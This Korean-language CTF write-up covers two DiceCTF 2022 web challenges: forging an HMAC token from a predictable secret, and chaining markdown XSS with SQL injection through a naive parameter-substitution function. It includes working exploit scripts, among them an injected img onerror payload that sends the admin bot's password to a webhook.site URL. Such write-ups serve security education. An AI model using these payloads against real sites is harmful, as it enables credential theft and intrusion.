# DiceCTF 2022 WriteUp 
**CTF start Date: 2022-02-04 (2 day)**
***
- **[WEB] knock-knock (356 solves/107 points)**
- **[WEB] no-cookies (5 solves/415 points)**
- 

## [WEB] knock-knock 
Knock knock? Who's there? Another pastebin!!

URL: https://knock-knock.mc.ax/

(356 solves/107 points)

### Analyse
문제에서 제공된 사이트에서 글쓰기, 읽기 기능을 확인할 수 있었다.

또한 문제 사이트의 소스코드가 제공이 되어 각각의 기능들을 파악하기 수월했다.

```javascript
class Database {
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }

  createNote({ data }) {
    const id = this.notes.length;
    this.notes.push(data);
    return {
      id,
      token: this.generateToken(id),
    };
  }

  getNote({ id, token }) {
    if (token !== this.generateToken(id)) return { error: 'invalid token' };
    if (id >= this.notes.length) return { error: 'note not found' };
    return { data: this.notes[id] };
  }

  generateToken(id) {
    return crypto
      .createHmac('sha256', this.secret)
      .update(id.toString())
      .digest('hex');
  }
}
const db = new Database();
db.createNote({ data: process.env.FLAG });
```

위 소스코드는 글쓰기, 읽기를 위해 작성된 코드이며 글을 생성하기 위한 **createNote** 함수에선 글이 몇번째 글인지 확인하는 **id** 값과 id 값으로 생성되는 **token**을 만들고, 글을 읽기 위한 **getNote** 함수에선 id, token값을 받아 id값으로 token을 생성하고 전달받은 token값과 비교해 일치하면 사용자에게 id에 해당하는 글을 전달하는 것을 알 수 있다.


token을 생성하는 함수는 **generateToken** 함수이며 **this.secret** 값을 암호화 키로 id값을 sha256 HMAC으로 변환해 token을 생성한다.


**this.secret** 값은 \`secret-${crypto.randomUUID}\`와 같이 template string으로 되어 있었다.


**flag**는 서비스가 시작될 때 글로 생성되어 지는걸 확인 할 수 있었다. 
flag가 포함된 글의 id값은 createNote 함수의 `const id = this.notes.length;` 코드로 생성되기에 0의 값을 가지는걸 알 수 있다.


### Find out the secret value

this.secret 값을 파악하기 위해 this.secret에 사용된 crypto.randomUUID 값을 보았다.

```javascript
> crypto.randomUUID
[Function: randomUUID]

> crypto.randomUUID.toString()
'function randomUUID(options) {\n' +
  '  if (options !== undefined)\n' +
```

예상과는 다르게 crypto.randomUUID는 string type이 아닌 function type을 가지고 있었고 toString의 결과값은 함수의 내용을 출력하고 있었다.
따라서 \`secret-${crypto.randomUUID}\` 값은 random한 UUID값이 아닌 유추가능하고 일정한 값임을 알 수 있었다.

```javascript
> `secret-${crypto.randomUUID}`
'secret-function randomUUID(options) {\n' +
  '  if (options !== undefined)\n' +
  "    validateObject(options, 'options');\n" +
  '  const {\n' +
  '    disableEntropyCache = false,\n' +
  '  } = { ...options };\n' +
```

### Generate flag token and read flag

서버와 동일한 버전의 nodejs에서 사용해야 한다.

```javascript
const request = require('request');
const crypto = require('crypto');
uri = "https://knock-knock.mc.ax/"
secret = `secret-${crypto.randomUUID}`;
token = crypto.createHmac('sha256', secret).update('0').digest('hex');
uri += `note?id=0&token=${token}`
const options = {
        uri,
};
request.get(options, function (error, response, body) {
        console.log(body);
});
```
***

## [WEB] no-cookies
I found a more secure way to authenticate users. No cookies, no problems!

URL: instancer.mc.ax/no-cookies

AdminBot: https://admin-bot.mc.ax/no-cookies

(5 solves/415 points)

### Analyse
adminbot이 제공되는걸 보아 XSS 문제임을 직감했다.

웹 서비스의 기능으론 register, login, create note, view note 가 있었고 

문제 이름처럼 사용자 검증에 cookie를 사용하지 않으며 각각의 기능들을 사용할 때 마다 사용자를 검증하였다.

##### index.js
```javascript
app.post('/create', (req, res) => {
  const { username, password, note, mode } = req.body;
  if (!username || !password || !note || !mode) return res.json({});
  const hash = sha(password);
  const user = db.get(
    'SELECT * FROM users WHERE username = :username AND password = :hash',
    {
      username,
      hash,
    }
  );
  if (!user) return res.json({});
  const id = crypto.randomBytes(16).toString('hex');
  db.run('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', {
    id,
    username,
    note: note.replace(/[<>]/g, ''),
    mode,
  });
  res.json({ id });
});
app.post('/view', (req, res) => {
  const { username, password, id } = req.body;
  if (!username || !password || !id) return res.json({});
  const hash = sha(password);
  const user = db.get(
    'SELECT * FROM users WHERE username = :username AND password = :hash',
    {
      username,
      hash,
    }
  );
  if (!user) return res.json({});
  const { note, mode, views } = db.get(
    'SELECT note, mode, views FROM notes WHERE id = :id',
    {
      id,
    }
  );
  if (!note || !mode) return res.json({});
  db.run('UPDATE notes SET views = views + 1 WHERE id = :id', { id });
  res.json({ note, mode, views });
});
```

create url는 사용자를 검증한 후 POST method로 전달받은 note, mode값을 database notes table에 저장시킨다.

저장하기 전 XSS를 방지하기 위해 note값에서 "<", ">"의 문자를 제거한다.

view url는 사용자를 검증한 후 note를 식별하는 id값을 POST method로 전달받아 database notes table에서 note 정보를 받아오게 된다.

##### view.html
``` html
<link rel="stylesheet" href="style.css">
<div class="container">
  <div class="note"></div>
  <hr />
  <em><span class="views"></span> view(s)</em>
</div>

<script>
  (() => {
    const validate = (text) => {
      return /^[^$']+$/.test(text ?? '');
    }

    const promptValid = (text) => {
      let result = prompt(text) ?? '';
      return validate(result) ? result : promptValid(text);
    }

    const username = promptValid('Username:');
    const password = promptValid('Password:');

    const params = new URLSearchParams(window.location.search);

    (async () => {
      const { note, mode, views } = await (await fetch('/view', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          password,
          id: params.get('id')
        })
      })).json();

      if (!note) {
        alert('Invalid username, password, or note id');
        window.location = '/';
        return;
      }

      let text = note;
      if (mode === 'markdown') {
        text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {
          return `<a href="${p2}">${p1}</a>`;
        });
        text = text.replace(/#\s*([^\n]+)/g, (match, p1) => {
          return `<h1>${p1}</h1>`;
        });
        text = text.replace(/\*\*([^\n]+)\*\*/g, (match, p1) => {
          return `<strong>${p1}</strong>`;
        });
        text = text.replace(/\*([^\n]+)\*/g, (match, p1) => {
          return `<em>${p1}</em>`;
        });
      }

      document.querySelector('.note').innerHTML = text;
      document.querySelector('.views').innerText = views;
    })();
  })();
</script>
```

view.html은 사용자가 note를 읽기위해 접근하는 페이지이다.

페이지에 접근 시 사용자 검증을 위해 prompt로 username, password를 입력받게 되고 url에 존재하는 id parameter를 view url에 fetch function으로 전달하게 된다. 

view url에선 id parameter값에 해당하는 note를 반환되어 note의 mode에 따라 note의 text값이 가공되고 HTML Element class값이 note인 Element안에 HTML로 삽입되어 진다.

##### admin-bot.js
``` javascript
export default {
  id: 'no-cookies',
  name: 'no-cookies',
  urlRegex:
    /^https:\/\/no-cookies-[a-f0-9]{16}\.mc\.ax\/view\?id=[a-f0-9]{32}$/,
  timeout: 10000,
  extraFields: [
    {
      name: 'instance',
      displayName: 'Instance ID',
      placeholder: 'no-cookies-{THIS}.mc.ax',
      regex: '^[0-9a-f]{16}$',
    },
  ],
  handler: async (url, ctx, { instance }) => {
    const page = await ctx.newPage();

    const doLogin = async (username, password) => {
      return new Promise((resolve) => {
        page.once('dialog', (first) => {
          page.once('dialog', (second) => {
            second.accept(password);
          });
          first.accept(username);
          resolve();
        });
      });
    };

    // make an account
    const username = Array(32)
      .fill('')
      .map(() => Math.floor(Math.random() * 16).toString(16))
      .join('');
    const password = flag;

    const firstLogin = doLogin(username, password);

    try {
      page.goto(`https://no-cookies-${instance}.mc.ax/register`);
    } catch {}

    await firstLogin;

    await sleep(3000);

    // visit the note and log in
    const secondLogin = doLogin(username, password);

    try {
      page.goto(url);
    } catch {}

    await secondLogin;

    await sleep(3000);
  },
};
```
adminbot은 문제 사이트에 접속해 로그인을 하고 3초 후 사용자가 제공한 문제 사이트의 url에 접속해 로그인을 한다.

로그인에 사용되는 **password에 flag**가 존재하므로 password를 알아내면 문제를 해결할 수 있다.

### make XSS

note를 생성할 때 note text값에는 "<",">"가 제거가 되어 mode가 plain일 때 XSS가 발생할 수 지만 mode가 markdown일 때는 text값이 가공되어 XSS가 발생할 수 있다.

``` javascript
      let text = note;
      if (mode === 'markdown') {
        text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {
          return `<a href="${p2}">${p1}</a>`;
        });
        text = text.replace(/#\s*([^\n]+)/g, (match, p1) => {
          return `<h1>${p1}</h1>`;
        });
        text = text.replace(/\*\*([^\n]+)\*\*/g, (match, p1) => {
          return `<strong>${p1}</strong>`;
        });
        text = text.replace(/\*([^\n]+)\*/g, (match, p1) => {
          return `<em>${p1}</em>`;
        });
      }

      document.querySelector('.note').innerHTML = text;
```
위 코드에서 첫번째 replace문을 만족시키는 text값은 "\[x\]\(y\)"의 형식이 되고 이 text 값은 '<a href="y">x</a>' 처럼 가공되어 진다.

text에 x, y값에 Double Quote가 삽입되어 질 수 있어 
''\[hi\]\(" onfocus=alert(1) autofocus="\)' => '<a href="" onfocus=alert(1) autofocus="">x</a>'
처럼 a tag 내에 attribute를 조작해 XSS를 발생시킬 수 있다.

XSS를 발생은 확인이 되었지만 adminbot의 password값은 arrow function 내에 존재하기에 외부에서 password값을 읽을 순 없었다.

### Use RegExp.input ($_)

https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input
>>Description
The input property is static, it is not a property of an individual regular expression object. Instead, you always use it as RegExp.input or RegExp.$_.
The value of the input property is modified whenever the searched string on the regular expression is changed and that string is matching.

RegExp.input은 regular expression에 matching 되었을때 값이 설정되게 된다.
``` javascript
/[$]/.test("match $"); // true
/[$]/.test("not match"); // false
console.log(RegExp.input); // match $
/[$]/.test("match2 $"); // true
console.log(RegExp.input); // match2 $
```

XSS를 발생시켜 RegExp.input을 확인 해보면 markdown mode쪽 replace와 text값이 matching이 되기 때문에 RegExp.input 값이 text값으로 설정된다.

문제에서 사용되는 regular expression은 6개이며 아래와 같은 순이다.
```
username -> password { if mode markdown -> a tag -> h1 tag -> strong tag -> em tag }
```

RegExp.input값이 password값으로 설정되기 위해선 markdown mode에서 matching이 되지 않아야 한다.

하지만 XSS를 발생시키기 위해선 markdown과 matching이 되어야 한다는 모순이 발생하게 된다...

### XSS with SQL Injection 

adminbot의 password 값을 알아내기 위해선 위에서 사용된 XSS가 아닌 다른 XSS가 필요한걸 알게 되었다.

index.js를 살펴보다 database 기능에서 사용하는 prepare function에서 취약점을 찾게 되었다.

#### index.js
```
const db = {
  prepare: (query, params) => {
    if (params)
      for (const [key, value] of Object.entries(params)) {
        const clean = value.replace(/['$]/g, '');
        query = query.replaceAll(`:${key}`, `'${clean}'`);
      }
    return query;
  },
  get: (query, params) => {
    const prepared = db.prepare(query, params);
    try {
      return database.prepare(prepared).get();
    } catch {}
  },
  run: (query, params) => {
    const prepared = db.prepare(query, params);
    try {
      return database.prepare(prepared).run();
    } catch {}
  },
};
```
prepare function는 params라는 object를 받아 key와 value값으로 나눠 순차적으로 query에 존재하는 :key 값을 value로 치환시킨다.

여기서 value값에 "'" 필터링은 존재하나 ":"문자에 대한 필터링이 없어 ":" + 다음 key값으로 value를 주게되면 SQL Injection이 가능해 진다.

create url의 insert 문에서 SQL Injection을 발생시킬 수 있으며 아래와 같은 과정으로 발생한다.

```
POST /create note=:mode3c696d67207372633d78206f6e6572726f723d616c657274285265674578702e696e707574293e&mode=||x

=> db.run('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', {
    id,
    username,
    note: note.replace(/[<>]/g, ''),
    mode,
  });

=> db.prepare('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', {id, username, note, mode});

=> 'INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)'.replaceAll(`:id`, `'something'`);

=> 'INSERT INTO notes VALUES ('something', :username, :note, :mode, 0)'.replaceAll(`:username`, `'something'`);

=> 'INSERT INTO notes VALUES ('something', 'something', :note, :mode, 0)'.replaceAll(`:note`, `':mode3c696d67207372633d78206f6e6572726f723d616c657274285265674578702e696e707574293e'`);

=> 'INSERT INTO notes VALUES ('something', 'something', ':mode3c696d67207372633d78206f6e6572726f723d616c657274285265674578702e696e707574293e', :mode, 0)'.replaceAll(`:mode`, `'||x'`);

=> db.run('INSERT INTO notes VALUES ('something', 'something', ''||x'3c696d67207372633d78206f6e6572726f723d616c657274285265674578702e696e707574293e', '||x', 0)');

=> 'INSERT INTO notes VALUES ('something', 'something', '<img src=x onerror=alert(RegExp.input)>', '||x', 0)'
```

### Exploit code

``` python
from requests import *
import binascii

# prob
url = "https://no-cookies-a4478463b8cbe067.mc.ax/"
# receive
rhost = "https://webhook.site/5d89413f-6d1f-48c1-8a74-3f38a6b3eb44"

def register():

        data = '{"username":"nga", "password":"nga"}'
        headers = {"Content-Type": "application/json"}
        res = post(url + "register", data=data, headers=headers)
        print(res.text)

def create(script):

        note = ":mode" + binascii.hexlify(script.encode()).decode()
        print(note)
        data = '"username":"nga", "password":"nga", "note": "{}", "mode": "||x"'.format(note)
        data = "{" + data + "}"
        headers = {"Content-Type": "application/json"}
        res = post(url + "create", data=data, headers=headers)
        print(res.text)

if __name__ == '__main__':

        register()
        create('<img src=x onerror="navigator.sendBeacon(`{}`, RegExp.input);">'.format(rhost))
```
***
